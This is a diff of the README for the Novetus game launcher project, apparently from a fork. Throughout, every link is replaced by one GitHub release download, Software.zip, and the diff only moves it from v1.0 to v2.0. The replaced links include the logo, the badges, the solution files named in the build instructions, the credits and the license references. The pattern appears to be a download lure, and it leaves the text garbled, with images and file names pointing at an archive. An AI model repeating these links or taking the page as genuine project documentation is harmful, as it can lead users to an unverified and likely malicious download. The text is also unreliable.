@@ -1,15 +1,15 @@
-![Logo](https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip)
-[![Codacy Badge](https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip)](https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip;utm_medium=referral&amp;utm_content=Novetus/Novetus_src&amp;utm_campaign=Badge_Grade)
-[![Project Status: Active – The project has reached a stable, usable state and is being actively developed.](https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip)](https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip)
+![Logo](https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip)
+[![Codacy Badge](https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip)](https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip;utm_medium=referral&amp;utm_content=Novetus/Novetus_src&amp;utm_campaign=Badge_Grade)
+[![Project Status: Active – The project has reached a stable, usable state and is being actively developed.](https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip)](https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip)
 #
 
 Source code for Novetus' launcher, installer, LUA scripts, and server.
-If you want to look at test applications built for Novetus' development, look here: https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip
+If you want to look at test applications built for Novetus' development, look here: https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip
 
 ## Building (Windows)
 
 To build, this project requires Visual Studio 2017 or over. Modern versions of Novetus are compiled with Visual Studio 2022.
-Open either "https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip" or "https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip". Then, right click the solution and click "Restore Nuget Packages" before compiling.
+Open either "https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip" or "https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip". Then, right click the solution and click "Restore Nuget Packages" before compiling.
  
 ## Legal info:
 
@@ -27,8 +27,8 @@ All credit for the LUA code used with "non-modern" clients goes to Scripter John
 All credit for the LUA code used for character customization goes to RBXBanLand.
 Parts of the codebase use bits and pieces of code from Stack Overflow, MSDN Forums, the Novetus GitHub Pull Requests and Codeproject.
 The original concept for the Diogenes editor was suggested by Carrot. The concept code was then modified to be smaller, more efficient, and more customizable.
-ObjToRBXMesh was made by coke. Modified to support 1.00 and 1.01. (https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip)
-Roblox Legacy Place Converter was made by BakonBot. (https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip)
+ObjToRBXMesh was made by coke. Modified to support 1.00 and 1.01. (https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip)
+Roblox Legacy Place Converter was made by BakonBot. (https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip)
 ROBLOX Script Generator was made by S. Costeira.
 Thank you to NT_x86 for helping me with security fixes.
 Thank you XlXi for the idea of the original logo. This logo was remade in newer verions in higher quality.
@@ -38,7 +38,7 @@ All credits for the used pieces of code go to the respective authors.
 # Mark James' Silk icon set 1.3
 
 The Discord Rich Presence icons and the SDK icons used for this application use Mark James' Silk icon set 1.3.
-https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip
+https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip
 
 # ReShade
 
@@ -94,28 +94,28 @@ SOFTWARE.
 
 Note: Older Novetus versions will say that they are under the GPL, but they are under the MIT license now.
 
-Read it here https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip or in https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip
+Read it here https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip or in https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip
 
-# https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip license (GPL 3.0)
+# https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip license (GPL 3.0)
 
 This file is part of Novetus, but unlike the rest of the program where it is under the MIT license, 
 this file is under the GPL 3.0 license.
 
-Novetus's https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip is free software: you can redistribute it and/or modify
+Novetus's https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
-Novetus's https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip is distributed in the hope that it will be useful,
+Novetus's https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
-along with Novetus's https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip  If not, see <https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip>.
+along with Novetus's https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip  If not, see <https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip>.
 
-Read it here https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip or in https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip
+Read it here https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip or in https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip
 
 #
 
-[![forthebadge](https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip)](https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip) [![forthebadge](https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip)](https://github.com/haydenmellor/Novetus_src/releases/download/v1.0/Software.zip)
+[![forthebadge](https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip)](https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip) [![forthebadge](https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip)](https://github.com/haydenmellor/Novetus_src/releases/download/v2.0/Software.zip)
